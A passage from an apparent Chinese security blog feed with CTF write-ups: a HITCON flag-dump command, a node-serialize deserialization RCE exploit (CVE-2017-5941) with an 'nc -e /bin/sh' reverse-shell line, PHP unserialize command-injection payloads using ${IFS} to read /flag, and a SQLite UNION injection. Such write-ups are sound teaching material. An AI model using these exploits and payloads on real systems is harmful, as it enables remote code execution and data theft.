<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;(SELECT * FROM fl4gdb.this_is_the_fl4g&quot; &gt;　kk9</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk9，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk9，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secret</div><div class="line">hitcon&#123;idea_from_phith0n,thank_you:)&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/8.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HITCON CTF 2017-BabyFirst Revenge-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Node.js中的反序列化漏洞：CVE-2017-5941</title>
    <link href="http://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/"/>
    <id>http://chybeta.github.io/2017/11/01/Node-js中的反序列化漏洞：CVE-2017-5941/</id>
    <published>2017-11-01T10:14:53.000Z</published>
    <updated>2017-11-01T13:08:53.157Z</updated>
    
    <content type="html"><![CDATA[<p>合上吧，水文一篇。<br>Node.js中的反序列化漏洞？<br>（Node.js：这锅我不背）<br><a id="more"></a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>安装好node和npm后，安装一下主角node-serialize<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install node-serialize@0.0.4 --save</div></pre></td></tr></table></figure></p>
<p>测试代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> chybeta = &#123;</div><div class="line">	<span class="attr">vuln</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'whoami'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) </span>&#123;<span class="built_in">console</span>.log(stdout);&#125;);&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">serResult = serialize.serialize(chybeta);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"serialize result:"</span>);</div><div class="line"><span class="built_in">console</span>.log(serResult+<span class="string">'\n'</span>);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Direct unserialize:"</span>)</div><div class="line">serialize.unserialize(serResult);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"\n"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Use IIFE to PWN it:"</span>)</div><div class="line">exp = serResult.substr(<span class="number">0</span>,serResult.length<span class="number">-2</span>) + <span class="string">"()"</span> + serResult.substr(<span class="number">-2</span>);</div><div class="line"><span class="built_in">console</span>.log(exp);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Exec whoami:"</span>)</div><div class="line">serialize.unserialize(exp);</div></pre></td></tr></table></figure></p>
<p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node index.js</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/5.png?raw=true" alt=""><br>可以看到执行了命令whoami</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="关于IIFE"><a href="#关于IIFE" class="headerlink" title="关于IIFE"></a>关于IIFE</h2><p>从运行截图来看，直接对序列化串进行反序列化，并不能导致远程命令执行，而是需要对序列化串进行修改。这里需要用到JS的IIFE(Immediately-Invoked Function Expression)，也即立即执行函数。这里简单的进行介绍。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/6.png?raw=true" alt=""></p>
<p>前两种写法都是很正常的函数调用。</p>
<p>而第三种<code>function(){console.log(&quot;Hello,chybeta three!&quot;)}();</code>，由于它直接以<code>function()</code>开头，js解释器默认情况下碰到function关键字时将其当作函数声明，而第三种写法缺少函数声明所必需的函数名。若要执行该函数，则必须显式地指定其为函数表达式。</p>
<p>第四种写法<code>(function(){console.log(&quot;Hello,chybeta four!&quot;)}());</code>，则是常见的IIFE写法，js解释器在遇到<code>()</code>时，将其中的内容解释为函数表达式，而不是函数声明，因此得以执行。注意在<code>Hello,chybeta four!&quot;)}</code>的后面还有一对括号<code>()</code></p>
<h2 id="node-serialize"><a href="#node-serialize" class="headerlink" title="node-serialize"></a>node-serialize</h2><p>在node-serialize的源码中，即node-serialize/lib/serialize.js，第59行开始，是对反序列(unserialize)的处理：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">exports.unserialize = <span class="function"><span class="keyword">function</span>(<span class="params">obj, originObj</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> isIndex;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">'string'</span>) &#123;</div><div class="line">    obj = <span class="built_in">JSON</span>.parse(obj);</div><div class="line">    isIndex = <span class="literal">true</span>;</div><div class="line">  &#125;</div><div class="line">  originObj = originObj || obj;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> circularTasks = [];</div><div class="line">  <span class="keyword">var</span> key;</div><div class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</div><div class="line">    <span class="keyword">if</span>(obj.hasOwnProperty(key)) &#123;</div><div class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span>) &#123;</div><div class="line">        obj[key] = exports.unserialize(obj[key], originObj);</div><div class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'string'</span>) &#123;</div><div class="line">        <span class="keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">'('</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">')'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = obj[key].substring(CIRCULARFLAG.length);</div><div class="line">          circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">   .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中有一句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);</div></pre></td></tr></table></figure></p>
<p>不妨在该句之前加上console.log：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">console.log(obj[key].substring(FUNCFLAG.length));</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/7.png?raw=true" alt=""></p>
<p>执行<code>node index.js</code>，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/8.png?raw=true" alt=""></p>
<p>所以在进行eval时，实际进行的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((function ()&#123;require(&apos;child_process&apos;).exec(&apos;whoami&apos;, function(error, stdout, stderr) &#123;console.log(stdout);&#125;);&#125;()));</div></pre></td></tr></table></figure></p>
<p>后面的这对括号<code>()</code>，正是我们在修改原反序列化串时加上的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exp = serResult.substr(0,serResult.length-2) + &quot;()&quot; + serResult.substr(-2);</div></pre></td></tr></table></figure></p>
<p>eval执行了该语句，从而造成了命令执行。</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>将exec里的替换成反弹shell，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh xxx xxx</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/9.png?raw=true" alt=""></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://paper.seebug.org/213/" target="_blank" rel="external">利用 Node.js 反序列化漏洞远程执行代码</a></li>
<li><a href="http://www.4hou.com/technology/3457.html" target="_blank" rel="external">NodeJS反序列化RCE漏洞的完美利用</a></li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>无聊玩一玩。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;合上吧，水文一篇。&lt;br&gt;Node.js中的反序列化漏洞？&lt;br&gt;（Node.js：这锅我不背）&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="Node.js" scheme="http://chybeta.github.io/tags/Node-js/"/>
    
      <category term="反序列化" scheme="http://chybeta.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2017年百越杯AWD-web-writeup</title>
    <link href="http://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/"/>
    <id>http://chybeta.github.io/2017/10/28/2017年百越杯AWD-web-writeup/</id>
    <published>2017-10-28T01:03:50.000Z</published>
    <updated>2017-10-31T23:15:33.821Z</updated>
    
    <content type="html"><![CDATA[<p>再不更新博客就长草啦。<br>PHP反序列化漏洞。<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周五参加福建省百越杯比赛，第二名。这篇小记一下线下赛的web题目，就当时找的漏洞做个简要的说明。由于一些配置不太清楚，所以现在复现起来可能不太准确，望见谅。原环境是linux下的，这里暂时win复现。</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>先看一下web源码的目录大概如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/1.png?raw=true" alt=""></p>
<p>在common文件下，有一个home.php，其源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</div><div class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</div><div class="line">        system(<span class="string">"ping -c 2 $host"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</div><div class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line">$a=@$_POST[<span class="string">'a'</span>];</div><div class="line">@unserialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>首先有一个home类，然后通过post接受参数a，并对其进行反序列化。仔细观察home类，里面有几个方法。</p>
<p><code>__construct</code>析构方法进行初始化操作，指定$method和$args。</p>
<p><code>__destruct</code>析构方法在对象销毁时调用，其中使用了<a href="http://php.net/manual/en/function.call-user-func-array.php" target="_blank" rel="external">call_user_func_array()</a>，如果method中有ping，则会调用ping方法，其参数即为$args。</p>
<p><code>ping</code>方法执行sysyem命令：<code>system(&quot;ping -c 2 $host&quot;);</code>，注意到$host参数，由前即home类实例的$args。</p>
<p><code>waf</code>方法，将传入的字符串中的空格去掉。</p>
<p><code>__wakeup</code>方法，在反序列化时会自动调用，其中实现的功能是将参数$args先经过mysql_escape_string()，然后去除两边空格（trim），调用waf方法去掉字符串中的空格。</p>
<p>看到这里，思路就很明确啦。构造反序列化字符串，先经过<code>__wakeup</code>的过滤，在执行结束后利用<code>__destruct</code>调用ping方法，利用其中的system执行任意命令。</p>
<p>exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;   </div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</div><div class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</div><div class="line">        system(<span class="string">"ping -c 2 $host"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</div><div class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line"></div><div class="line">print_r(<span class="string">"New a chybeta :)&lt;/br&gt;"</span>);</div><div class="line">$chybeta = <span class="keyword">new</span> home(<span class="string">"ping"</span>,<span class="keyword">array</span>(<span class="string">"1|whoami"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"&lt;/br&gt;Get the serialize result:&lt;/br&gt;"</span>);</div><div class="line">$exp = serialize($chybeta);</div><div class="line">print_r($exp);</div><div class="line"></div><div class="line">print_r(<span class="string">"&lt;/br&gt;&lt;/br&gt;unserialize and pwn it&lt;/br&gt;"</span>);</div><div class="line">print_r(<span class="string">"exec: system(\"whoami\")&lt;/br&gt;The result:  "</span>);</div><div class="line">serialize($exp);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/2.png?raw=true" alt=""></p>
<p>直接复制打印出来的反序列化串去post参数给home.php，并不成功。原因是有一些不可见字符。对以上的exp进行小改动，将反序列话结果输出到文件中，再用十六进制编辑器打开。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents(<span class="string">"temp"</span>, $exp);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/3.png?raw=true" alt=""><br>可以上发现有一些零字节需要补上，最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">访问 common/home.php</div><div class="line"></div><div class="line">POST:</div><div class="line">a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/4.png?raw=true" alt=""></p>
<p>接下来进一步利用，在比赛时，我们需要读取到放在根目录下的flag（/flag）。而waf方法过滤了空格，这额可以用linux下的特殊变量<code>\$\{IFS\}</code>来代替。所以如果要读取flag，修改exp.php，注意需要转义<code>$</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$chybeta = new home(&quot;ping&quot;,array(&quot;1|cat\$&#123;IFS&#125;/flag&quot;));</div></pre></td></tr></table></figure></p>
<p>关于linux环境下的命令执行绕过waf的方法，不妨看看这个: <a href="https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md" target="_blank" rel="external">WAF-Bypass<br>:命令注入</a></p>
<p>最后的payload即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">访问 common/home.php</div><div class="line"></div><div class="line">POST:</div><div class="line">a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:16:&quot;1|cat$&#123;IFS&#125;/flag</div></pre></td></tr></table></figure></p>
<p>防御方法，直接将<code>@unserialize($a);</code>注释掉就行啦。</p>
<p>关于PHP反序列化漏洞，可以看看另一篇文章：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">chybeta: 浅谈php反序列化漏洞</a></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>比赛攻击是用的就是这个洞，应该还有其他漏洞，后面再进一步补上吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;再不更新博客就长草啦。&lt;br&gt;PHP反序列化漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hack.lu CTF 2017-Flatscience-writeup</title>
    <link href="http://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/"/>
    <id>http://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/</id>
    <published>2017-10-22T00:24:11.000Z</published>
    <updated>2017-10-22T15:50:05.169Z</updated>
    
    <content type="html"><![CDATA[<p>SQLite injection<br>burte force</p>
<a id="more"></a>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">The Professor on Flat Earth is Prof. Flux Horst. Only for bragging he made his own Blog showcasing his favorite Papers. Beeing the only Professor, he thinks he is the smartest Person arround the Plate. Can you proof him wrong and log into his Admin-Panel?</div><div class="line">Link  https://flatscience.flatearth.fluxfingers.net/</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/4.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>基本功能就是，提供了一堆的paper下载。。一共有30个pdf。整个站的基本结构如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/7.png?raw=true" alt=""></p>
<p>访问 <a href="https://flatscience.flatearth.fluxfingers.net/robots.txt" target="_blank" rel="external">https://flatscience.flatearth.fluxfingers.net/robots.txt</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow: /login.php</div><div class="line">Disallow: /admin.php</div></pre></td></tr></table></figure></p>
<p>存在一个登陆页面： <a href="https://flatscience.flatearth.fluxfingers.net/login.php" target="_blank" rel="external">https://flatscience.flatearth.fluxfingers.net/login.php</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/1.png?raw=true" alt=""></p>
<p>view-source下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/2.png?raw=true" alt=""></p>
<p>访问 <a href="https://flatscience.flatearth.fluxfingers.net/login.php?debug" target="_blank" rel="external">https://flatscience.flatearth.fluxfingers.net/login.php?debug</a>  ，得到源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</div><div class="line">        $user = $_POST[<span class="string">'usr'</span>];</div><div class="line">        $pass = $_POST[<span class="string">'pw'</span>];</div><div class="line"></div><div class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</div><div class="line"></div><div class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</div><div class="line">    <span class="keyword">if</span>($res)&#123;</div><div class="line">        $row = $res-&gt;fetchArray();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</div><div class="line">                setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</div><div class="line">                header(<span class="string">"Location: /"</span>);</div><div class="line">                <span class="keyword">die</span>();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</div><div class="line">highlight_file(<span class="string">'login.php'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>通过POST接收usr和pw参数。没有做任何过滤，带入sql查询。若查询的结果id字段不为空，则执行setcookie操作，会将查询的结果name字段插入到cookie中。</p>
<p>考虑如下数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">https://flatscience.flatearth.fluxfingers.net/login.php</div><div class="line"></div><div class="line">POST:</div><div class="line">usr=%27 UNION SELECT name, sql from sqlite_master--+&amp;pw=chybeta</div></pre></td></tr></table></figure></p>
<p>注意sqlite的注释符是<code>--</code>，带入查询后，sql注入的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT id,name from Users where name=&apos; &apos; UNION SELECT name, sql from sqlite_master-- and password= &apos;chybeta&apos;</div></pre></td></tr></table></figure></p>
<p>从<code>and</code>起后面部分被注释掉。利用union联合查询sqlite系统表（ sqlite_master），得到的id值其实是表的名字（name），而得到的name值其实是创建表时的语句（sql）。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/3.png?raw=true" alt=""></p>
<p>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE Users(</div><div class="line">id int primary key,</div><div class="line">name varchar(255),</div><div class="line">password varchar(255),</div><div class="line">hint varchar(255)</div><div class="line">)</div></pre></td></tr></table></figure></p>
